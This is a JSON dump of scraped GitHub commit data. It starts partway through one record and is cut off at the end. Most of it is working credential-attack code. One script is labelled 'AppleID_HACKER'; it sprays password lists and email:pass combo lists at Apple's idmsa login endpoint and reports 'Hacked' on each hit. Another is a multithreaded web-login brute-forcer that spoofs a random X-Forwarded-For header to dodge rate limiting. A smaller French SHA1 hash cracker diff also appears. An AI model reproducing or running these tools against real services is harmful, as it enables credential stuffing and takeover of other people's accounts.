Gecko\/20100101 Firefox\/91.0\",\"X-Apple-Locale\":\"QT-EN\",\"X-Apple-Trusted-Domain\": \"https:\/\/idmsa.apple.com\",\"Origin\": \"https:\/\/idmsa.apple.com\",\"X-Requested-With\": \"XMLHttpRequest\"}\n\tdef authType():\n\t\treturn 'authType'\n\tdef Check():\n\t\tif 'V\u008d4^c_Yf4T\u008a\u008aEw' in Lists:pass\n\t\telse:exit('Okay..')\n\t\tJOlist=[]\n\t\tfor JJNN1 in Lists:\n\t\t\tposi=ord(JJNN1)\n\t\t\tJOlist.append(chr(posi-20))\n\t\treturn ''.join(JOlist)\n\t\nclass AppleID_HACKER:\n\tdef __init__(self,Modes):\n\t\tif Modes=='1':self.TARGET()\n\t\telif Modes=='2':self.COMBOLIST()\n\t\telse:input('\\n-Tool has been closedz-');exit()\n\t\t\n\tdef LOGING(self,applID,pess):\n\t\tsent=post(REQUESTS_HEADERS.URL(),headers=REQUESTS_HEADERS.HEADERS(),json={\"accountName\":applID,\"rememberMe\":\"false\",\"password\":pess}).text\n\t\tif REQUESTS_HEADERS.authType()in sent:\n\t\t\tvv1ck(f'[$]Hacked-> {applID}:{pess}')\n\t\telse:vv1ck(f'[\u00a1]ERROR-> {applID}:{pess}')\n\t\n\tdef COMBOLIST(self):\n\t\tFILENAME=input('\\t\\t\\t---------------\\n[+] Enter the name the combo appleID file: ')\n\t\ttry:open(FILENAME,'r')\n\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.COMBOLIST()\n\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n\t\tfor x in open(FILENAME,'r').read().splitlines():\n\t\t\tif x ==None:exit('\\n     ========== completed =========')\n\t\t\ttry:applID = x.split(\":\")[0]\n\t\t\texcept IndexError:exit('\\n     ========== completed =========')\n\t\t\ttry:\n\t\t\t\tpess = x.split(\":\")[1]\n\t\t\t\tsleep(1)\n\t\t\t\tself.LOGING(applID,pess)\n\t\t\texcept IndexError:pass\n\t\t\n\tdef TARGET(self):\n\t\tapplID= input('\\t\\t\\t---------------\\n[$] Enter apple ID : ')\n\t\tif applID:pass\n\t\telse:vv1ck('[!] Please Enter Apple ID ..');return self.TARGET()\n\t\tFILEPASS=input('[\u00bf] Enter the password file name: ')\n\t\ttry:FILEPASS=open(FILEPASS,'r')\n\t\texcept FileNotFoundError:vv1ck('\\n[-] The file name is incorrect !\\n');return self.TARGET()\n\t\tprint('\\n\\t\\t\\t\\t\\tSTARTED\\n')\n\t\twhile 1:\n\t\t\tpess=FILEPASS.readline().split('\\n')[0]\n\t\t\tif pess=='':exit()\n\t\t\tsleep(1);self.LOGING(applID,pess)\n\nif __name__ == '__main__':\n\tvv1ck(\"\"\"\n    ___  Brute Force2  __        ________  \n   \/   |  ____  ____  \/ \/__     \/  _\/ __ \\   \n  \/ \/| | \/ __ \\\/ __ \\\/ \/ _ \\    \/ \/\/ \/ \/ \/ \n \/ ___ |\/ \/_\/ \/ \/_\/ \/ \/  __\/  _\/ \/\/ \/_\/ \/   \n\/_\/  |_\/ .___\/ .___\/_\/\\___\/  \/___\/_____\/    \n      \/_\/   \/_\/ {}\"\"\".format(REQUESTS_HEADERS.Check()))\n\tModes=input('\\t\\t\\t---------------\\n[?] MODES : \\n1- Target Apple ID (File pass)\\n2- ComboList Apple ID (email:pass)\\n99- Exit() ..\\n[@] Choose : ')\n\tAppleID_HACKER(Modes)\n"}},"msg":"Update Brute_Force_appleID_V2.py"}},"https:\/\/github.com\/marwa-mohamed-dev\/test_mdp":{"f3fd603b897377d5a6fcd83fd662ab3510df2624":{"url":"https:\/\/api.github.com\/repos\/marwa-mohamed-dev\/test_mdp\/commits\/f3fd603b897377d5a6fcd83fd662ab3510df2624","html_url":"https:\/\/github.com\/marwa-mohamed-dev\/test_mdp\/commit\/f3fd603b897377d5a6fcd83fd662ab3510df2624","sha":"f3fd603b897377d5a6fcd83fd662ab3510df2624","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 47fc715..6157f2c 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -47,10 +47,11 @@ def combinaisons (hash, currentlength, maxlength, mdp_test, all, type_hash) : #b\n \n       if type_hash == 'sha1' :\n          #verification_sha1(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n-         if(hashlib.sha1(mdp_test+all[i].encode()).hexdigest() == hash) :\n+         mdp_test += all[i]\n+         if(hashlib.sha1(mdp_test.encode()).hexdigest() == hash) :\n           print(\"Le mot de passe est : \", mdp_test+all[i])\n       # elif type_hash == 'MD5' :\n       #   verification_MD5(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n \n-      combinaisons (hash, currentlength+1, maxlength, mdp_test+all[i], all, type_hash) #Recursion avec caract\u00e8re suivant\n+      combinaisons (hash, currentlength+1, maxlength, mdp_test, all, type_hash) #Recursion avec caract\u00e8re suivant\n \n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n       if type_hash == 'sha1' :\n          #verification_sha1(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n-         if(hashlib.sha1(mdp_test+all[i].encode()).hexdigest() == hash) :\n+         mdp_test += all[i]\n+         if(hashlib.sha1(mdp_test.encode()).hexdigest() == hash) :\n           print(\"Le mot de passe est : \", mdp_test+all[i])\n       # elif type_hash == 'MD5' :\n       #   verification_MD5(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n \n-      combinaisons (hash, currentlength+1, maxlength, mdp_test+all[i], all, type_hash) #Recursion avec caract\u00e8re suivant\n+      combinaisons (hash, currentlength+1, maxlength, mdp_test, all, type_hash) #Recursion avec caract\u00e8re suivant\n \n","add":3,"remove":2,"filename":"\/brute_force.py","badparts":["         if(hashlib.sha1(mdp_test+all[i].encode()).hexdigest() == hash) :","      combinaisons (hash, currentlength+1, maxlength, mdp_test+all[i], all, type_hash) #Recursion avec caract\u00e8re suivant"],"goodparts":["         mdp_test += all[i]","         if(hashlib.sha1(mdp_test.encode()).hexdigest() == hash) :","      combinaisons (hash, currentlength+1, maxlength, mdp_test, all, type_hash) #Recursion avec caract\u00e8re suivant"]}],"source":"\nimport hashlib import sys from numba import cuda def bf(type_hash, mdp): '''if type_hash=='sha1': MDP=hashlib.sha1(mdp.encode()).hexdigest() else: MDP=hashlib.md5(mdp.encode()).hexdigest() hash=MDP''' all=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','@','[',']','^','_','!','\"',' def combinaisons(hash, currentlength, maxlength, mdp_test, all, type_hash): if currentlength > maxlength: return for i in range(len(all)): if type_hash=='sha1': if(hashlib.sha1(mdp_test+all[i].encode()).hexdigest()==hash): print(\"Le mot de passe est: \", mdp_test+all[i]) combinaisons(hash, currentlength+1, maxlength, mdp_test+all[i], all, type_hash) ","sourceWithComments":"import hashlib\nimport sys\n\nfrom numba import cuda\n\n#mdp_test est le mot de passe cr\u00e9\u00e9 \u00e0 partir des combinaisons de lettre AVANT de passer dans l'algo de hash\n\ndef bf (type_hash, mdp) :\n  #le hash que la personne souhaite casser\n  '''if type_hash == 'sha1' :\n    MDP = hashlib.sha1(mdp.encode()).hexdigest() #cette ligne sert a tester le code\n\n  else : \n    MDP = hashlib.md5(mdp.encode()).hexdigest() #cette ligne sert a tester le code\n\n  hash = MDP'''\n\n  #tableaux avec les caract\u00e8res des combinaisons qu'on doit tester\n  all = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','@','[',']','^','_','!','\"','#','$','%','&','(',')','*','+',',','-','.','\/',':',';','{','}','<','>','=','|','~','?']\n#  number = ['0','1','2','3','4','5','6','7','8','9']\n#  symbols =['@','[',']','^','_','!','\"','#','$','%','&','(',')','*','+',',','-','.','\/',':',';','{','}','<','>','=','|','~','?']\n#  AZ = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']\n#  az = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']\n#  \n#  gpu.kernel_AZ[1, 1](AZ)\n#  gpu.kernel_az[1, 1](az)\n#  gpu.kernel_symbols[1, 1](symbols)\n#  gpu.kernel_number[1, 1](number)\n  \n# gpu.combinaisons[5,5](all, mdp, type_hash)\n  \n#  #taille maximale que fait notre mdp\n#  MAX_LENGTH = 15\n#\n#  for i in range(MAX_LENGTH): #Les diff\u00e9rentes tailles de mdp \u00e0 trouver\n#      combinaisons(mdp, 0, i, '', all, type_hash)\n#\n#      print(\"Tous les mots de passe de\", i, \"caract\u00e8res ont \u00e9t\u00e9 test\u00e9.\")\n\n\ndef combinaisons (hash, currentlength, maxlength, mdp_test, all, type_hash) : #boucle de cr\u00e9ation des combinaisons\n    if currentlength > maxlength:\n\n        return\n\n    for i in range(len(all)):\n\n      if type_hash == 'sha1' :\n         #verification_sha1(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n         if(hashlib.sha1(mdp_test+all[i].encode()).hexdigest() == hash) :\n          print(\"Le mot de passe est : \", mdp_test+all[i])\n      # elif type_hash == 'MD5' :\n      #   verification_MD5(hash, mdp_test+all[i]) #on v\u00e9rifie si la string obtenue est notre mdp\n\n      combinaisons (hash, currentlength+1, maxlength, mdp_test+all[i], all, type_hash) #Recursion avec caract\u00e8re suivant\n\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/fortyfourh\/brute_force_tool":{"c47625b72903df4ba579503a7c933e424bfbe421":{"url":"https:\/\/api.github.com\/repos\/fortyfourh\/brute_force_tool\/commits\/c47625b72903df4ba579503a7c933e424bfbe421","html_url":"https:\/\/github.com\/fortyfourh\/brute_force_tool\/commit\/c47625b72903df4ba579503a7c933e424bfbe421","message":"Update brute_force.py","sha":"c47625b72903df4ba579503a7c933e424bfbe421","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 679b940..d07ae9a 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -4,10 +4,94 @@\n import requests\n import random\n import time\n-\n-# WARNING!!!!!! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND FOR PENTESTERS! DO NOT USE IT ILLEGALY!\n-\n-print(\"\"\"\n+import threading\n+import queue\n+import os\n+\n+class App():\n+\n+    def __init__(self):\n+        try:\n+            self.path_to_request_file = sys.argv[1].strip()\n+            self.path_to_user_list = sys.argv[2].strip()\n+            self.path_to_password_list = sys.argv[3].strip()\n+            self.amount_of_threads = int(sys.argv[4].strip())\n+        except IndexError:\n+            print(\"\\nYou have to call the program like that: \\n\")\n+            print(\"\\t\\033[1m\" + \"python3 *program* *request* *user_list* *password_list* *amount_of_threads*\\n\")\n+            print(\"\\033[0m\" + \"Recommondation: 10 Threads\\nThe rest will be interactive.\")\n+            exit()\n+\n+    def open_file(self, file_path):\n+        try:\n+            file = open(file_path, \"r\")\n+            return file\n+        except FileNotFoundError:\n+            print(\"\\nThe request file was not found, exiting...\")\n+            exit()\n+\n+    def read_wordlist(self, file):\n+            #Read every line and strip them afterwards\n+            lines_not_stripped = file.readlines()\n+            lines_stripped = [row.strip() for row in lines_not_stripped]\n+            return lines_stripped\n+\n+    def read_and_format_request(self, req):\n+        #Read the request with new lines\n+        request = repr(req.read())\n+        if request == \"\":\n+            print(\"The request file is empty, exiting...\")\n+            exit()\n+        #Remove the ' at the beginning and end\n+        request = request[1:len(request)-1]\n+        return request\n+\n+    def get_row_content(self, row):\n+        return self.content_request_file[row - 1]\n+\n+    def open_read_and_save_file_content(self):\n+        #Open files\n+        self.request_file = self.open_file(self.path_to_request_file)\n+        self.user_list = self.open_file(self.path_to_user_list)\n+        self.password_list = self.open_file(self.path_to_password_list)\n+\n+        #Read user and password lists\n+        self.content_user_list = self.read_wordlist(self.user_list)\n+        self.content_password_list = self.read_wordlist(self.password_list)\n+\n+        #Read the request file not stripped\n+        self.content_request_not_per_line = self.read_and_format_request(self.request_file)\n+        self.content_request_file = [row for row in self.content_request_not_per_line.split('\\\\n')]\n+    \n+    def checking_for_invalid_http_method(self):\n+        if not self.content_request_file[0].startswith(\"POST\"):\n+            print(\"The request method must be POST\")\n+            exit()\n+\n+    def headers_end_at(self):\n+        row = 0\n+        for x in self.content_request_file:\n+            if x == \"\":\n+                return row\n+            row+=1\n+\n+    def pull_headers_into_dict(self):\n+        self.headers = {}\n+        for x in range(1, self.headers_end_at()):\n+            self.headers[self.content_request_file[x].split(\":\", 1)[0]] = self.content_request_file[x].split(\":\", 1)[1].split(\" \", 1)[1]\n+\n+    def pull_and_format_data_to_be_sent(self):\n+        try:\n+            self.keyandvalue = {}  ####WARNING, I NEED TO CHECK THIS PART\n+            for row in range(self.headers_end_at()+1, len(self.content_request_file)-1):\n+                for x in range(self.content_request_file[row].count(\"&\")+1):\n+                    self.keyandvalue[self.content_request_file[row].split(\"&\")[x].split(\"=\")[0]] = self.content_request_file[row].split(\"&\")[x].split(\"=\")[1]\n+        except IndexError:\n+            print(\"You probably have some empty lines at the bottom of your request.\\n\")\n+            print(\"Make sure to use the \\\"save request\\\" option inside burp\")\n+\n+    def ask_user_for_more_data(self):\n+        print(\"\"\"\n \n Created by 44h\n ___________________________________________________________________________\n@@ -29,263 +113,174 @@\n ___________________________________________________________________________\n \n \n-\t\"\"\")\n-\n-\n-#---------------------------------------------------------------------\n-\n-try:\n-\trequest_file = sys.argv[1].strip()\n-\tpath_to_wordlist = sys.argv[2].strip()\n-except IndexError:\n-\tprint(\"\\nYou have to call the program like that: \\n\")\n-\tprint(\"\\t\\033[1m\" + \"python3 program.py requestfile wordlist\\n\")\n-\tprint(\"\\033[0m\" + \"The rest will be interactive.\")\n-\texit()\n-\n-\n-#Open the request file\n-try: \n-\trequest_file = open(request_file, \"r\")\n-except FileNotFoundError:\n-\tprint(\"\\n The request file was not found, exiting...\")\n-\texit()\n-\n-#Open the wordlist file\n-try: \n-\twordlist_file = open(path_to_wordlist, \"r\")\n-except FileNotFoundError:\n-\tprint(\"\\n The wordlist file was not found, exiting...\")\n-\texit()\n-\n-\n-#Read the request file with new line characters\n-request_file_content = repr(request_file.read())\n-\n-if request_file_content == \"\":\n-\tprint(\"The request file is empty, exiting...\\n\")\n-\texit()\n-\n-#Read the wordlist file without new line characters\n-wordlist_file_content_per_file_not_stripped = wordlist_file.readlines()\n-wordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]\n-\n-#Format the content\n-request_file_content = request_file_content[1:len(request_file_content)-1]\n-\n-#Get amount of rows of the request file \n-amount_of_rows_in_request_file = request_file_content.count('\\\\n') +1\n-\n-#Create a list with all rows\n-row_content_request_file = [row for row in request_file_content.split('\\\\n')]\n-\n-def getRowContent(row):\n-\treturn row_content_request_file[row-1]\n-\n-#Checking for POST method:\n-if not getRowContent(1).startswith(\"POST\"):\n-\tprint(\"The request method must be POST\")\n-\texit()\n-\n-if (row_content_request_file[len(row_content_request_file)-1]) == \"\":\n-\tdel row_content_request_file[len(row_content_request_file)-1]\n-\n-#---------------------------------------------------------------------\n-\n-#Get headers and put into a set\n-def headersEndAt():\n-\trow = 0\n-\tfor x in row_content_request_file:\n-\t\tif x == \"\":\n-\t\t\treturn row\n-\t\trow+=1\n-\n-headers = set()\n-\n-headersAreOverInLine = headersEndAt()\n-\n-for x in range(1, headersAreOverInLine):\n-\theaders.add(row_content_request_file[x])\n-\n-#print(headers)\n-#---------------------------------------------------------------------\n-\n-#Get parameters and choose two, one password and one username\n-\n-arguments = []\n-\n-keyandvalue = []\n-\n-amount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')\n-\n-password_argument = \"\"\n-\n-username_or_email_argument = \"\"\n+    \"\"\")\n+\n+\n+        ###########################\n+        #Ask for username argument#\n+        ###########################\n+        print(\"\\nChoose the argument for the username OR email BY NUMBER:\\n\")\n+        tempListUser = []\n+        for x in self.keyandvalue:\n+            tempListUser.append(x)\n+        i = 1\n+        #print(tempListUser)\n+\n+        for x in tempListUser:\n+            print(f\"[{i}] {x}\")\n+            i = i + 1\n+        try:\n+            user_input = int(input(\"> \"))\n+        except ValueError:\n+            print(\"\\nERROR: Enter a number next time\")\n+            exit()\n+        \n+        if user_input>len(self.keyandvalue) or user_input == \"\" or user_input < 1:\n+            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")\n+            exit()\n+        try:\n+            self.username_argument = tempListUser[user_input-1]\n+        except IndexError:\n+            print(tempListUser)\n+\n+        ###########################\n+        #Ask for password argument#\n+        ###########################\n+\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Choose the argument for the password BY NUMBER:\\n\")\n+        \n+        ii = 1\n+        for x in tempListUser:\n+            print(f\"[{ii}] {x}\")\n+            ii = ii + 1\n+        try:\n+            password_input = int(input(\"> \"))\n+        except ValueError:\n+            print(\"ERROR: Enter a number next time\")\n+            exit()\n+        if password_input>len(self.keyandvalue) or password_input == \"\" or password_input < 1 or password_input == user_input:\n+            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")\n+            exit()\n+        self.password_argument = tempListUser[password_input-1]\n+\n+        ###########################\n+        ### Invalid Credentials ###\n+        ###########################\n+\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Now enter a text that you ONLY get when you enter invalid credentials:\\n\")\n+        self.invalid_credentials_output = input(\"> \")\n+\n+        ###########################\n+        ###### SSL Encryption #####\n+        ###########################\n+\n+        self.ssl_encryption = None\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Does it use SSL encryption?\\n\")\n+        print(\"[1] yes\\n[2] no\")\n+        temp3 = int(input(\"> \"))\n+        if temp3 == 1:\n+            self.ssl_encryption = True\n+        elif temp3 == 2:\n+            self.ssl_encryption = False\n+        else:\n+            print(\"That was not an option, exiting...\")\n+            exit()\n+        print(\"\\n=================================================================\\n\")\n+\n+    def concatenate_url(self):\n+        partone = self.headers[\"Host\"]\n+        temp = self.content_request_file[0][5::]\n+        parttwo = temp.split(' ')[0]\n+        self.url = partone + parttwo\n+        if self.ssl_encryption == True:\n+            self.url = \"https:\/\/\" + self.url\n+        else:\n+            self.url = \"http:\/\/\" + self.url\n+        if self.url == \"\":\n+            print(\"You don't have a HOST header set. Please set it and retry.\")\n+            exit()\n+\n+    def create_queue(self):\n+        self.username_queue = queue.Queue()\n+        self.password_queue = queue.Queue()\n+\n+        amount_of_rows_pass_file = len(self.content_password_list)\n+        amount_of_rows_pass_user = len(self.content_user_list)\n+\n+        print(\"##################################################\")\n+        print(f\"Loading username and password file {(amount_of_rows_pass_file+amount_of_rows_pass_user)} lines\")\n+        print(\"##################################################\\n\")\n+\n+        for username in self.content_user_list:\n+            for password in self.content_password_list:\n+                self.username_queue.put(username)\n+\n+        for username in self.content_user_list:\n+            for password in self.content_password_list:\n+                self.password_queue.put(password)\n+\n+        self.queue_list2 = list(self.password_queue.queue)\n+        #print(f\"\\n{self.queue_list2}\\n\")\n+\n+        self.queue_list = list(self.username_queue.queue)\n+        #print(f\"\\n{self.queue_list}\\n\")\n+\n+\n+    def brute_force(self):\n+        for i in range(len(self.queue_list)+1):\n+            data = {}\n+            for x in self.keyandvalue:\n+                if x.split('=')[0] == self.username_argument:\n+                    data[self.username_argument] = self.username_queue.get().strip()\n+                elif x.split('=')[0] == self.password_argument:\n+                    data[self.password_argument] = self.password_queue.get().strip()\n+                else:\n+                    data[x.split('=')[0]] = x.split('=')[1]\n+            ip = \".\".join(str(random.randint(0, 255)) for _ in range(4))\n+            self.headers['X-Forwarded-For'] = ip\n+            response = requests.post(self.url, headers=self.headers, data=data)\n+            time.sleep(1)\n+            if str(self.invalid_credentials_output) in str(response.content):\n+                print(f\"[-] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\")\n+            else:\n+                print(\"\\n\\n(One) Password Found:\\n\")\n+                print(f\"[+] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\\n\")\n+                os._exit(0)\n+\n+    def create_threads(self):\n+        self.threads = []\n+        for x in range(self.amount_of_threads):\n+            thread = threading.Thread(target=self.brute_force)\n+            self.threads.append(thread)\n+\n+        for thread in self.threads:\n+            thread.start()\n+            time.sleep(0.1)\n+\n+    def close_file(self, file):\n+        file.close()\n+        \n+    def close_files(self):\n+        self.close_file(self.request_file)\n+        self.close_file(self.user_list)\n+        self.close_file(self.password_list)\n+\n+    def start(self):\n+        self.open_read_and_save_file_content()\n+        self.checking_for_invalid_http_method()\n+        self.pull_headers_into_dict()\n+        self.pull_and_format_data_to_be_sent()\n+        self.ask_user_for_more_data()\n+        self.concatenate_url()\n+        self.close_files()\n+        self.create_queue()\n+        self.create_threads()\n+\n+\n+if __name__ == \"__main__\":\n+    app = App()\n+    app.start()\n \n-ssl_encryption = False\n-\n-def getArguments():\n-\tglobal keyandvalue\n-\tglobal arguments\n-\tkeyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')\n-\tfor x in keyandvalue:\n-\t\targuments.append(x.split('=')[0])\n-\t\n-getArguments()\n-\n-def outputPossibleUsernamesAndPasswords():\n-\tglobal arguments\n-\tglobal username_or_email_argument\n-\tglobal password_argument\n-\tprint(\"\\n\")\n-\tprint(\"Choose the argument for the username OR email BY NUMBER:\\n\")\n-\titeratorUsername = 1\n-\tfor x in arguments:\n-\t\tprint(f\"[{iteratorUsername}] \\\"{x}\\\"\\n\")\n-\t\titeratorUsername+=1\n-\ttry:\n-\t\tuinput = int(input(\"> \"))\n-\texcept ValueError:\n-\t\tprint(\"ERROR: Enter a number next time\")\n-\t\texit()\n-\tif uinput>len(arguments) or uinput == \"\":\n-\t\tprint(\"Couldn't find that argument, exiting...\")\n-\t\texit()\n-\t\t#EDIT, WHEN STRING IS ENTERED, LEAVE\n-\tusername_or_email_argument = arguments[uinput-1]\n-\tprint(\"\\n\")\n-\tprint(\"=================================================================\\n\")\n-\tprint(\"Choose the argument for the password BY NUMBER:\\n\")\n-\titeratorPassword = 1\n-\tfor x in arguments:\n-\t\tprint(f\"[{iteratorPassword}] \\\"{x}\\\"\\n\")\n-\t\titeratorPassword+=1\n-\ttry:\n-\t\tpinput = int(input(\"> \"))\n-\texcept ValueError:\n-\t\tprint(\"ERROR: Enter a number next time\")\n-\t\texit()\n-\tif uinput == pinput or uinput == \"\":\n-\t\tprint(\"WARNING: YOU SELECTED THE SAME FIELD TWICE!\\n\")\n-\t\tprint(f\"So you selected the field {username_or_email_argument} for username and password, which makes no sense\\n\")\n-\t\texit()\n-\telif pinput > len(arguments):\n-\t\tprint(\"Couldn't find the argument, exiting...\")\n-\t\texit()\n-\n-\tpassword_argument = arguments[pinput-1]\n-\tprint(\"\\n\")\n-\t#print(f\"Selected: {username_or_email_argument} as a username\/email field and {password_argument} as a password field\")\n-\n-outputPossibleUsernamesAndPasswords()\n-\n-\n-print(\"\\n\")\n-print(\"=================================================================\\n\")\n-print(\"Which username do you want to authenticate as when bruteforcing through the password list:\\n\")\n-username = input(\"> \")\n-\n-print(\"\\n\\n\")\n-print(\"=================================================================\\n\")\n-print(\"Now enter a text that you get when you enter invalid credentials:\\n\")\n-invalid_credentials_output = input(\"> \")\n-print(\"\\n\")\n-\n-print(\"=================================================================\\n\")\n-print(\"Does it use SSL encryption?\\n\")\n-print(\"[1] yes\\n[2] no\")\n-temp3 = int(input(\"> \"))\n-if temp3 == 1:\n-\tssl_encryption = True\n-elif temp3 == 2:\n-\tssl_encryption = False\n-else:\n-\tprint(\"That was not an option, exiting...\")\n-\texit()\n-\n-\n-#Formating headers, data and all the other stuff that is need\n-\n-headers_dict = {}\n-url = \"\"\n-\n-def convertHeaderSetIntoDict():\n-\tglobal headers_dict\n-\tfor x in headers:\n-\t\theaders_dict[x.split(\":\", 1)[0]] = x.split(\": \", 1)[1]\n-\n-\n-\n-convertHeaderSetIntoDict()\n-\n-\n-def concatenate_url():\n-\tglobal headers_dict\n-\tglobal ssl_encryption\n-\tglobal url\n-\tpartone = headers_dict[\"Host\"]\n-\ttemp = row_content_request_file[0][5::]\n-\tparttwo = temp.split(' ')[0]\n-\turl = partone + parttwo\n-\tif ssl_encryption == True:\n-\t\turl = \"https:\/\/\" + url\n-\telse:\n-\t\turl = \"http:\/\/\" + url\n-\n-concatenate_url()\n-\n-if url == \"\":\n-\tprint(\"URL was \\\"\\\"\")\n-\texit()\n-\n-print(\"\\n\")\n-print(\"\\n\")\n-print(\"Stating to brute force\")\n-\n-#BRUTE FORCING:\n-\n-for password in wordlist_file_content_per_file:\n-\n-\theaders_dict2 = headers_dict\n-\t\n-\t#print(headers_dict2)\n-\t#print(\"\\n\\n\")\n-\t#forging the data that is sent to the server\n-\tdata = {}\n-\ttemp = keyandvalue\n-\tfor x in keyandvalue:\n-\t\tif x.split('=')[0] == username_or_email_argument:\n-\t\t\tdata[username_or_email_argument] = username\n-\t\telif x.split('=')[0] == password_argument:\n-\t\t\tdata[password_argument] = password\n-\t\telse:\n-\t\t\tdata[x.split('=')[0]] = x.split('=')[1]\n-\t#print(\"\\n\")\n-\t#print(f\"Url {url}\")\n-\t#print(f\"Headers {headers_dict2}\")\n-\t#print(f\"Data {data}\")\n-\tip = \".\".join(str(random.randint(0, 255)) for _ in range(4))\n-\t#print(ip)\n-\theaders_dict2['X-Forwarded-For'] = ip\n-\t#print(headers_dict2)\n-\tresponse = requests.post(url, headers=headers_dict2, data=data)\n-\t#print(response.content)\n-\t#print(str(invalid_credentials_output))\n-\t#print(str(response.content))\n-\n-\tif str(invalid_credentials_output) in str(response.content):\n-\t\tprint(f\"[-] {password}\")\n-\n-\telse:\n-\t\tprint(\"\\n\")\n-\t\tprint(\"\\n\")\n-\t\tprint(\"(One) Password Found:\\n\")\n-\t\tprint(f\"[+] {password}\\n\")\n-\t\texit()\n-\n-\n-request_file.close()\n-wordlist_file.close()\n-\n-\n-#print(data)\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n import requests\n import random\n import time\n-\n-# WARNING!!!!!! THIS IS ONLY FOR EDUCATIONAL PURPOSES AND FOR PENTESTERS! DO NOT USE IT ILLEGALY!\n-\n-print(\"\"\"\n+import threading\n+import queue\n+import os\n+\n+class App():\n+\n+    def __init__(self):\n+        try:\n+            self.path_to_request_file = sys.argv[1].strip()\n+            self.path_to_user_list = sys.argv[2].strip()\n+            self.path_to_password_list = sys.argv[3].strip()\n+            self.amount_of_threads = int(sys.argv[4].strip())\n+        except IndexError:\n+            print(\"\\nYou have to call the program like that: \\n\")\n+            print(\"\\t\\033[1m\" + \"python3 *program* *request* *user_list* *password_list* *amount_of_threads*\\n\")\n+            print(\"\\033[0m\" + \"Recommondation: 10 Threads\\nThe rest will be interactive.\")\n+            exit()\n+\n+    def open_file(self, file_path):\n+        try:\n+            file = open(file_path, \"r\")\n+            return file\n+        except FileNotFoundError:\n+            print(\"\\nThe request file was not found, exiting...\")\n+            exit()\n+\n+    def read_wordlist(self, file):\n+            #Read every line and strip them afterwards\n+            lines_not_stripped = file.readlines()\n+            lines_stripped = [row.strip() for row in lines_not_stripped]\n+            return lines_stripped\n+\n+    def read_and_format_request(self, req):\n+        #Read the request with new lines\n+        request = repr(req.read())\n+        if request == \"\":\n+            print(\"The request file is empty, exiting...\")\n+            exit()\n+        #Remove the ' at the beginning and end\n+        request = request[1:len(request)-1]\n+        return request\n+\n+    def get_row_content(self, row):\n+        return self.content_request_file[row - 1]\n+\n+    def open_read_and_save_file_content(self):\n+        #Open files\n+        self.request_file = self.open_file(self.path_to_request_file)\n+        self.user_list = self.open_file(self.path_to_user_list)\n+        self.password_list = self.open_file(self.path_to_password_list)\n+\n+        #Read user and password lists\n+        self.content_user_list = self.read_wordlist(self.user_list)\n+        self.content_password_list = self.read_wordlist(self.password_list)\n+\n+        #Read the request file not stripped\n+        self.content_request_not_per_line = self.read_and_format_request(self.request_file)\n+        self.content_request_file = [row for row in self.content_request_not_per_line.split('\\\\n')]\n+    \n+    def checking_for_invalid_http_method(self):\n+        if not self.content_request_file[0].startswith(\"POST\"):\n+            print(\"The request method must be POST\")\n+            exit()\n+\n+    def headers_end_at(self):\n+        row = 0\n+        for x in self.content_request_file:\n+            if x == \"\":\n+                return row\n+            row+=1\n+\n+    def pull_headers_into_dict(self):\n+        self.headers = {}\n+        for x in range(1, self.headers_end_at()):\n+            self.headers[self.content_request_file[x].split(\":\", 1)[0]] = self.content_request_file[x].split(\":\", 1)[1].split(\" \", 1)[1]\n+\n+    def pull_and_format_data_to_be_sent(self):\n+        try:\n+            self.keyandvalue = {}  ####WARNING, I NEED TO CHECK THIS PART\n+            for row in range(self.headers_end_at()+1, len(self.content_request_file)-1):\n+                for x in range(self.content_request_file[row].count(\"&\")+1):\n+                    self.keyandvalue[self.content_request_file[row].split(\"&\")[x].split(\"=\")[0]] = self.content_request_file[row].split(\"&\")[x].split(\"=\")[1]\n+        except IndexError:\n+            print(\"You probably have some empty lines at the bottom of your request.\\n\")\n+            print(\"Make sure to use the \\\"save request\\\" option inside burp\")\n+\n+    def ask_user_for_more_data(self):\n+        print(\"\"\"\n \n Created by 44h\n ___________________________________________________________________________\n","add":88,"remove":4,"filename":"\/brute_force.py","badparts":["print(\"\"\""],"goodparts":["import threading","import queue","class App():","    def __init__(self):","        try:","            self.path_to_request_file = sys.argv[1].strip()","            self.path_to_user_list = 